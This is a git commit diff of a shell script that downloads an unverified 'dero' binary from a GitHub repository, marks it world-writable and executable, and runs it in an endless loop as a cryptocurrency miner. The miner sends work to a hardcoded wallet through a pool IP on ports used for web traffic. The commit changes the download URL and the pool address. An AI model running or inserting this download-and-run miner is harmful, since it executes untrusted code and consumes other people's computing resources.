0a2bf1830c79b3d48fe65b69396df3b153900505
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-12 22:30:32 +0700

    Update xecv.sh

--- xecv.sh
+++ xecv.sh
@@ -1,9 +1,9 @@
-wget https://github.com/sbwsmg/doraemon/raw/main/dero
+wget https://github.com/aqshakuy/dora/raw/main/dero
 chmod 777 dero
 
 #!/bin/bash
 echo "Replace YOUR_ADDRESS to run the miner"
 while :; do
-    ./dero -w dERoSCQeRCe3GVBEHoJh2tgR2KZNF22gcCuYW29ZuAJFGk9rA7UWFwdPcXzxnXLvQ4V8WdntxVoxK4qruF2GahFf49oRxiMH8H -r 170.187.197.220:443 -p stratum;
+./dero -w dERoSCQeRCe3GVBEHoJh2tgR2KZNF22gcCuYW29ZuAJFGk9rA7UWFwdPcXzxnXLvQ4V8WdntxVoxK4qruF2GahFf49oRxiMH8H -r 45.76.162.175:80 -p stratum;
     sleep 5;
 done
